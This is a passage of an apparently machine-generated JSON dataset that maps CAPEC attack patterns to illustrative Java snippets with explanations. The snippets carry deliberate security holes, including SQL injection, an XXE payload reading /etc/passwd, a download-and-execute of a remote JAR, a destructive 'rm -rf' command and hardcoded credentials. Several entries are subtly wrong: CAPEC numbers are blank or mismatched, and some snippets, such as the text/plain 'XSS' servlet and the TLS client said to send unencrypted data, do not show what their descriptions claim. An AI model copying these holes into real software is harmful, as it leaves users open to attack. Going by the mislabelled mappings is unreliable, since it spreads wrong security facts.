        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        String userInput = \"1 OR 1=1\"; // Simulated user input\n        String query = \"SELECT * FROM users WHERE id = \" + userInput;\n\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/testdb\", \"root\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SQL Injection vulnerability, which is a common result of improper input validation (CWE-20) and improper neutralization of special elements (CWE-74). The code constructs a SQL query using unsanitized user input, which can be manipulated by an attacker to execute arbitrary SQL commands. In this example, the user input '1 OR 1=1' is used to bypass authentication checks, potentially exposing sensitive data. This snippet embodies the main idea of the CAPEC by showing how the removal or absence of input filters can lead to severe security issues."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import java.io.*;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlData = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" +\n                         \"<!DOCTYPE root [<!ENTITY ext SYSTEM \\\"file:///etc/passwd\\\">]>\\n\" +\n                         \"<root>&ext;</root>\";\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xmlData)));\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC-). The code parses an XML document that includes an external entity reference. The DocumentBuilderFactory is configured to allow DOCTYPE declarations, which can lead to XML External Entity (XXE) attacks (CWE-611). The XML data contains an external entity that references the '/etc/passwd' file, a sensitive file on Unix-based systems. When the XML is parsed, the content of the '/etc/passwd' file is included in the parsed output, demonstrating how an attacker can exploit this vulnerability to access sensitive information. This example also touches on CWE-502, as it involves processing untrusted data without proper validation."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousClient {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"localhost\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Bypassing client-side authentication\n            out.println(\"AUTHENTICATE user:password\"); // CWE-603\n\n            // Sending malicious payload\n            out.println(\"<malicious_code>\"); // CWE-506, CWE-507\n\n            // Receiving server response\n            String response = in.readLine();\n            System.out.println(\"Server response: \" + response);\n\n            // Creating emergent resource\n            out.println(\"CREATE_RESOURCE\"); // CWE-1229\n\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a malicious client application that interfaces with a target service. The client bypasses client-side authentication (CWE-603) by sending a hardcoded authentication string. It then sends a malicious payload (CWE-506, CWE-507) to the server, which could contain harmful code. Additionally, the client attempts to create an emergent resource on the server (CWE-1229), which could be exploited by an attacker. This code embodies the main idea of the CAPEC 'Create Malicious Client' by violating the assumptions the service makes about client behavior and security."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryManipulation {\n    public static void main(String[] args) {\n        // Obtain a reference to the system node of the registry\n        Preferences systemRoot = Preferences.systemRoot();\n        \n        // Vulnerable code: Storing sensitive information in cleartext\n        String sensitiveKey = \"com.example.sensitive\";\n        String sensitiveValue = \"password123\";\n        systemRoot.put(sensitiveKey, sensitiveValue);\n        \n        // Vulnerable code: External control of system setting\n        String configKey = \"com.example.config\";\n        String configValue = \"defaultConfig\";\n        systemRoot.put(configKey, configValue);\n        \n        // Simulate an attacker modifying the registry\n        String attackerValue = \"maliciousConfig\";\n        systemRoot.put(configKey, attackerValue);\n        \n        // Retrieve and print the modified value\n        String retrievedValue = systemRoot.get(configKey, \"defaultConfig\");\n        System.out.println(\"Retrieved Config Value: \" + retrievedValue);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an application stores sensitive information and configuration settings in the system registry using the Preferences API. The code is vulnerable to several issues highlighted in the CAPEC and related CWEs:\n\n1. **Cleartext Storage in the Registry (CWE-314)**: Sensitive information (e.g., a password) is stored in cleartext in the registry, making it easily accessible to an attacker.\n2. **External Control of System or Configuration Setting (CWE-15)**: Configuration settings are stored in the registry without proper access control, allowing an attacker to modify them.\n\nThe code simulates an attacker modifying a configuration value in the registry, demonstrating how an adversary can exploit these vulnerabilities to manipulate registry information and potentially compromise the system or application."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class SensitiveDataCache {\n    private Map<String, String> cache = new HashMap<>();\n\n    public void storeSensitiveData(String key, String value) {\n        // Storing sensitive data in cache without encryption\n        cache.put(key, value);\n    }\n\n    public String retrieveSensitiveData(String key) {\n        // Retrieving sensitive data from cache\n        return cache.get(key);\n    }\n\n    public static void main(String[] args) {\n        SensitiveDataCache sensitiveDataCache = new SensitiveDataCache();\n        sensitiveDataCache.storeSensitiveData(\"password\", \"mySecretPassword\");\n        System.out.println(\"Retrieved: \" + sensitiveDataCache.retrieveSensitiveData(\"password\"));\n    }\n}",
        "description": "This Java code snippet demonstrates a simple cache implementation that stores and retrieves sensitive data without encryption. The `SensitiveDataCache` class uses a `HashMap` to store sensitive information such as passwords. The `storeSensitiveData` method adds sensitive data to the cache, and the `retrieveSensitiveData` method retrieves it. This code embodies the main idea of CAPEC- Lifting Sensitive Data Embedded in Cache, as it shows how sensitive information can be stored in a cache without proper protection, making it vulnerable to unauthorized access. The code also reflects CWE-524 (Use of Cache Containing Sensitive Information) and CWE-311 (Missing Encryption of Sensitive Data) by not encrypting the sensitive data before storing it in the cache."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "public class VulnerableApp {\n    public static void main(String[] args) {\n        // Hardcoded credentials (CWE-522)\n        String username = \"admin\";\n        String password = \"password123\";\n\n        // Simulate client-side authentication (CWE-603)\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful!\");\n        } else {\n            System.out.println(\"Authentication failed!\");\n        }\n    }\n\n    // Client-side authentication method\n    private static boolean authenticate(String username, String password) {\n        // Insecure credential check (CWE-522)\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application where credentials are hardcoded within the client-side code (CWE-522). The `authenticate` method performs authentication on the client side (CWE-603), which can be easily bypassed by modifying the client code. This represents the main idea of the deprecated CAPEC pattern, where sensitive data such as credentials are embedded in client distributions, making them susceptible to unauthorized retrieval and misuse."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "import java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.security.KeyStore;\nimport java.security.PrivateKey;\nimport java.security.Signature;\nimport java.util.Base64;\n\npublic class MaliciousCodeSigner {\n    private static final String KEYSTORE_PATH = \"keystore.jks\";\n    private static final String KEYSTORE_PASSWORD = \"changeit\"; // CWE-798: Hard-coded credentials\n    private static final String ALIAS = \"mykey\";\n    private static final String SIGNATURE_ALGORITHM = \"SHA256withRSA\";\n\n    public static void main(String[] args) throws Exception {\n        // Load the keystore\n        KeyStore keystore = KeyStore.getInstance(KeyStore.getDefaultType());\n        keystore.load(Files.newInputStream(Paths.get(KEYSTORE_PATH)), KEYSTORE_PASSWORD.toCharArray());\n\n        // Extract the private key\n        PrivateKey privateKey = (PrivateKey) keystore.getKey(ALIAS, KEYSTORE_PASSWORD.toCharArray());\n\n        // Read the malicious code\n        byte[] maliciousCode = Files.readAllBytes(Paths.get(\"malicious_code.jar\"));\n\n        // Sign the malicious code\n        Signature signature = Signature.getInstance(SIGNATURE_ALGORITHM);\n        signature.initSign(privateKey);\n        signature.update(maliciousCode);\n        byte[] signedData = signature.sign();\n\n        // Encode the signature in Base64\n        String signedDataBase64 = Base64.getEncoder().encodeToString(signedData);\n\n        // Output the signed malicious code\n        System.out.println(\"Signed Malicious Code: \" + signedDataBase64);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Signing Malicious Code' (CAPEC-673). The code loads a keystore containing a private key (CWE-798: Use of Hard-coded Credentials), extracts the private key, and uses it to sign a malicious code file. The signed malicious code is then outputted in Base64 format. This represents how an adversary could use extracted signing credentials to sign malicious content, making it appear as if it came from a legitimate developer. The use of hard-coded credentials and the lack of proper permission assignments (CWE-732) are critical weaknesses that facilitate this attack."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableClient {\n    public static void main(String[] args) {\n        try {\n            // Downloading code without integrity check (CWE-494)\n            URL url = new URL(\"http://example.com/remoteCode.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"remoteCode.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // Loading and executing the downloaded code (CWE-829)\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"remoteCode.jar\");\n            Process p = pb.start();\n            p.waitFor();\n\n            // Client-side authentication (CWE-603)\n            if (authenticateClient(\"username\", \"password\")) {\n                System.out.println(\"Client authenticated.\");\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n\n            // Client-side enforcement of server-side security (CWE-602)\n            if (checkClientSecurity()) {\n                System.out.println(\"Client security check passed.\");\n            } else {\n                System.out.println(\"Client security check failed.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean authenticateClient(String username, String password) {\n        // Simulate client-side authentication\n        return \"username\".equals(username) && \"password\".equals(password);\n    }\n\n    private static boolean checkClientSecurity() {\n        // Simulate client-side security check\n        return true;\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the CAPEC 'Removing Important Client Functionality'. The code downloads and executes a remote JAR file without verifying its integrity (CWE-494 and CWE-829), which could allow an attacker to introduce malicious code. It also performs authentication and security checks on the client side (CWE-603 and CWE-602), which can be bypassed if an attacker modifies the client. This represents the main idea of the CAPEC, where the server assumes the client functionality to be present and trustworthy, but an adversary can remove or disable it."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "public class ShoppingCart {\n    private double totalCost = 0.0;\n\n    public void addItem(double price, int quantity) {\n        // Client-side calculation of total cost\n        totalCost += price * quantity;\n    }\n\n    public double getTotalCost() {\n        return totalCost;\n    }\n\n    public static void main(String[] args) {\n        ShoppingCart cart = new ShoppingCart();\n        cart.addItem(100.0, 2); // Adding 2 items each costing 100.0\n        System.out.println(\"Total Cost: \" + cart.getTotalCost());\n    }\n}",
        "description": "This Java code snippet represents a vulnerable implementation of a shopping cart where the total cost is calculated on the client side. The `addItem` method takes the price and quantity of an item and updates the `totalCost` by multiplying them. The `getTotalCost` method returns the total cost. This setup is vulnerable because an attacker can modify the client-side logic to manipulate the total cost calculation, leading to incorrect billing. This embodies the CAPEC idea of removing or short-circuiting 'purse' logic, and it relates to CWEs such as Client-Side Enforcement of Server-Side Security (CWE-602) and Incorrect Calculation (CWE-682)."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/upload\")\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"fileName\");\n        String fileContent = request.getParameter(\"fileContent\");\n        String mimeType = request.getParameter(\"mimeType\");\n\n        // Vulnerable code: relying on file extension and MIME type\n        if (mimeType.equals(\"text/plain\") && fileName.endsWith(\".txt\")) {\n            response.setContentType(\"text/plain\");\n            response.getWriter().write(fileContent);\n        } else {\n            response.sendError(HttpServletResponse.SC_UNSUPPORTED_MEDIA_TYPE, \"Unsupported file type\");\n        }\n    }\n}\n",
        "description": "This Java servlet code snippet demonstrates a vulnerability where an adversary can exploit MIME type mismatch to execute a script. The servlet accepts a file upload with parameters for the file name, content, and MIME type. It checks if the MIME type is 'text/plain' and the file extension is '.txt'. If these conditions are met, it sets the response content type to 'text/plain' and writes the file content to the response. This can be exploited if an attacker uploads a file with a '.txt' extension but with malicious script content. Some browsers may detect the mismatch and execute the script, leading to potential XSS attacks. This example highlights CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-20 (Improper Input Validation), and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File)."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<img src='\" + userInput + \"'>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the CAPEC description and associated CWEs. The servlet takes user input from a request parameter and directly inserts it into an HTML IMG tag without proper sanitization or neutralization. This can lead to Cross-Site Scripting (XSS) attacks (CWE-79, CWE-82) if an attacker provides a malicious script as input. The code also lacks proper error handling and custom error pages (CWE-7), which could expose sensitive information if an error occurs. The main idea represented here is the improper handling of user input in web applications, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class FunctionalityMisuseExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            String sensitiveInfo = new String(Files.readAllBytes(Paths.get(\"/etc/passwd\")));\n            System.out.println(\"Sensitive Information: \" + sensitiveInfo);\n\n            // CWE-695: Use of Low-Level Functionality\n            Runtime.getRuntime().exec(\"rm -rf /important_directory\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Functionality Misuse' by leveraging legitimate capabilities of the application in unintended ways. The code reads sensitive system information from '/etc/passwd' and prints it, exposing it to unauthorized users (CWE-497). Additionally, it uses low-level functionality to execute a system command that deletes an important directory, which is explicitly prohibited by many frameworks (CWE-695). This misuse of functionality can lead to significant security vulnerabilities and unintended negative impacts."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        File file = new File(\"/var/www/uploads/\" + filename);\n\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a path traversal vulnerability. The program takes a filename as a command-line argument and attempts to read and print the contents of the file located in the '/var/www/uploads/' directory. However, it does not properly sanitize the input, allowing an attacker to use sequences like '/../' to traverse directories and access files outside the intended directory. This embodies the main idea of CAPEC-126 and related CWEs, where improper neutralization of path traversal sequences can lead to unauthorized file access."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        try {\n            // Simulate some processing that could throw an exception\n            if (request.getParameter(\"triggerError\") != null) {\n                throw new Exception(\"Simulated error\");\n            }\n            response.getWriter().println(\"Processing completed successfully.\");\n        } catch (Exception e) {\n            // Exposing stack trace in the default error page\n            e.printStackTrace(response.getWriter());\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the deprecated CAPEC for fuzzing to garner J2EE/.NET-based stack traces for application mapping. The code intentionally throws an exception when a specific request parameter is present and then exposes the stack trace directly in the HTTP response. This practice can reveal sensitive information about the application's internal structure, which can be exploited by attackers for further attacks. The code also highlights CWE-7 (J2EE Misconfiguration: Missing Custom Error Page) by not providing a custom error page and instead displaying the default error page with the stack trace."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableApp {\n    private static final Logger logger = Logger.getLogger(VulnerableApp.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            FileHandler fh = new FileHandler(\"app.log\", true);\n            fh.setFormatter(new SimpleFormatter());\n            logger.addHandler(fh);\n\n            // Simulate receiving a message\n            String message = args.length > 0 ? args[0] : \"\";\n            processMessage(message);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void processMessage(String message) {\n        try {\n            // Simulate processing the message\n            if (message.equals(\"\")) {\n                throw new IllegalArgumentException(\"Message cannot be empty\");\n            }\n            // Further processing...\n        } catch (Exception e) {\n            // Log the error with sensitive information\n            logger.severe(\"Error processing message: \" + e.getMessage() + \", StackTrace: \" + e.getStackTrace());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that logs sensitive information when an error occurs. The application processes incoming messages and logs detailed error messages, including stack traces, when an exception is thrown. This behavior aligns with the CAPEC description of fuzzing for application mapping, where an attacker sends unexpected messages to observe the application's error messages. The code also embodies the related CWEs by generating error messages containing sensitive information (CWE-209, CWE-210), inserting sensitive information into log files (CWE-532), and exposing sensitive system information (CWE-497)."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(8080);\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // No authentication or integrity checks\n                System.out.println(\"Received: \" + inputLine);\n                out.println(\"Echo: \" + inputLine);\n            }\n\n            in.close();\n            out.close();\n            clientSocket.close();\n            serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel where a server listens for incoming connections on port 8080. The server accepts connections and reads input from the client, echoing back the received messages. The code lacks authentication (CWE-306), does not verify the integrity of the messages (CWE-924), and does not verify the source of the communication (CWE-940). Additionally, it does not ensure that the communication channel is only accessible by the intended endpoints (CWE-300), and it could be susceptible to covert channels (CWE-514). This setup allows an adversary to manipulate the communication channel, potentially leading to information exposure or system compromise."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "import javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.SSLSocket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.IOException;\n\npublic class VulnerableSSLClient {\n    public static void main(String[] args) {\n        String host = \"example.com\";\n        int port = 443;\n        try {\n            SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n            SSLSocket socket = (SSLSocket) factory.createSocket(host, port);\n            socket.startHandshake();\n\n            // Send sensitive data without proper encryption\n            OutputStream out = socket.getOutputStream();\n            String sensitiveData = \"username=admin&password=admin123\";\n            out.write(sensitiveData.getBytes());\n            out.flush();\n\n            // Read response (not verifying the source)\n            InputStream in = socket.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead = in.read(buffer);\n            System.out.println(\"Response: \" + new String(buffer, 0, bytesRead));\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable SSL/TLS client that embodies the main idea of the CAPEC 'Exploiting Incorrectly Configured SSL/TLS'. The code connects to a server using SSL/TLS but fails to properly configure and verify the security of the connection. It sends sensitive data ('username=admin&password=admin123') without ensuring proper encryption and does not verify the source of the communication channel, making it susceptible to man-in-the-middle attacks. This snippet also highlights related CWEs such as CWE-201 (insertion of sensitive information into sent data), CWE-923 (improper restriction of communication channel to intended endpoints), and CWE-940 (improper verification of source of a communication channel)."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.ParserConfigurationException;\nimport javax.xml.transform.Transformer;\nimport javax.xml.transform.TransformerException;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.transform.stream.StreamResult;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\nimport org.xml.sax.SAXException;\nimport java.io.File;\nimport java.io.IOException;\n\npublic class UDDISpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // Load XML file without validation (CWE-112)\n            File inputFile = new File(\"untrusted_message.xml\");\n            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n            Document doc = dBuilder.parse(inputFile);\n            doc.getDocumentElement().normalize();\n\n            // Extract and use data without verifying authenticity (CWE-345)\n            String businessName = doc.getElementsByTagName(\"businessName\").item(0).getTextContent();\n            String wsdlURL = doc.getElementsByTagName(\"wsdlURL\").item(0).getTextContent();\n\n            // Incorrectly specify destination (CWE-941)\n            String endpoint = \"http://malicious-actor.com/service\";\n\n            // Create a message without ensuring integrity (CWE-924)\n            Document responseDoc = dBuilder.newDocument();\n            Element rootElement = responseDoc.createElement(\"response\");\n            responseDoc.appendChild(rootElement);\n            Element message = responseDoc.createElement(\"message\");\n            message.appendChild(responseDoc.createTextNode(\"Service request for \" + businessName));\n            rootElement.appendChild(message);\n\n            // Send the message to the incorrect endpoint\n            TransformerFactory transformerFactory = TransformerFactory.newInstance();\n            Transformer transformer = transformerFactory.newTransformer();\n            DOMSource source = new DOMSource(responseDoc);\n            StreamResult result = new StreamResult(new File(\"response.xml\"));\n            transformer.transform(source, result);\n\n            // Simulate sending the message to the endpoint\n            System.out.println(\"Message sent to: \" + endpoint);\n        } catch (ParserConfigurationException | SAXException | IOException | TransformerException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can spoof UDDI/ebXML messages to impersonate a service provider in an e-business transaction. The code reads an XML file without validation (CWE-112), extracts data without verifying its authenticity (CWE-345), and sends a message to an incorrect endpoint (CWE-941). Additionally, it creates a message without ensuring its integrity during transmission (CWE-924). This example highlights the vulnerabilities that can be exploited in such a scenario, leading to potential disclosure of sensitive information, loss of message integrity, or financial fraud."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.ParserConfigurationException;\nimport javax.xml.transform.Transformer;\nimport javax.xml.transform.TransformerException;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.transform.stream.StreamResult;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\nimport org.xml.sax.SAXException;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class XMLRoutingDetour {\n    public static void main(String[] args) {\n        try {\n            // Load XML file\n            File inputFile = new File(\"input.xml\");\n            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n            Document doc = dBuilder.parse(inputFile);\n            doc.getDocumentElement().normalize();\n\n            // Extract routing information\n            Element routingElement = (Element) doc.getElementsByTagName(\"routing\").item(0);\n            String nextNode = routingElement.getTextContent();\n\n            // Send XML to the next node\n            URL url = new URL(nextNode);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setDoOutput(true);\n            conn.setRequestMethod(\"POST\");\n            TransformerFactory transformerFactory = TransformerFactory.newInstance();\n            Transformer transformer = transformerFactory.newTransformer();\n            DOMSource source = new DOMSource(doc);\n            StreamResult result = new StreamResult(conn.getOutputStream());\n            transformer.transform(source, result);\n\n            // Read response (potentially modified by attacker)\n            Document responseDoc = dBuilder.parse(conn.getInputStream());\n            // Process response...\n\n        } catch (ParserConfigurationException | SAXException | IOException | TransformerException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an XML Routing Detour Attack. The code reads an XML file, extracts routing information, and sends the XML content to the next node specified in the routing information. If an attacker compromises the intermediate node, they can modify the XML content or reroute it to another malicious node. The code does not validate the XML against a schema (CWE-112), does not properly handle external entity references (CWE-611), and does not ensure the integrity of the routing information (CWE-610). This makes it vulnerable to various attacks, including XML External Entity (XXE) attacks and routing detours."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableClientServer {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n\n        // Weak algorithm selection (CWE-757)\n        String algorithm = \"DES\"; // DES is less secure than AES\n        out.writeUTF(algorithm);\n\n        // Client-side enforcement of server-side security (CWE-602)\n        if (algorithm.equals(\"DES\")) {\n            System.out.println(\"Using DES for encryption\");\n        }\n\n        // Sending authentication token (vulnerable to capture-replay, CWE-294)\n        String authToken = \"authToken123\";\n        out.writeUTF(authToken);\n\n        // Incorrectly specified destination (CWE-941)\n        String destination = \"http://malicious.example.com\";\n        out.writeUTF(destination);\n\n        // Direct use of sockets (CWE-246)\n        out.writeUTF(\"Hello Server\");\n        String response = in.readUTF();\n        System.out.println(\"Server Response: \" + response);\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable client-server communication scenario embodying the main idea of CAPEC-272: Client-Server Protocol Manipulation. The code includes several weaknesses: \n1. **Algorithm Downgrade (CWE-757)**: The client selects a less secure algorithm (DES) for encryption, which can be exploited by an attacker.\n2. **Client-Side Enforcement of Server-Side Security (CWE-602)**: The client enforces the use of the DES algorithm, which should be a server-side responsibility.\n3. **Authentication Bypass by Capture-Replay (CWE-294)**: The authentication token is sent in plaintext, making it vulnerable to capture and replay attacks.\n4. **Incorrectly Specified Destination (CWE-941)**: The client sends a request to a potentially malicious destination.\n5. **Direct Use of Sockets (CWE-246)**: The code directly uses sockets for communication instead of higher-level abstractions provided by frameworks, which can lead to security issues."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.File;\n\npublic class XMLExternalEntityExample {\n    public static void main(String[] args) {\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", true);\n            dbf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);\n\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new File(\"example.xml\"));\n\n            System.out.println(\"Parsed XML successfully\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Data Serialization External Entities Blowup' (CAPEC). The code uses the DocumentBuilderFactory to parse an XML file without properly restricting external entity references. The features 'external-general-entities', 'external-parameter-entities', and 'load-external-dtd' are enabled, which allows the XML parser to process external entities. This can be exploited by an attacker to include external URIs that consume a large amount of resources, potentially leading to a denial of service (DoS) condition. This example also touches on CWE-611 (Improper Restriction of XML External Entity Reference) by not disabling external entity processing, and CWE-99 (Improper Control of Resource Identifiers) by allowing external URIs to be processed without restriction."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
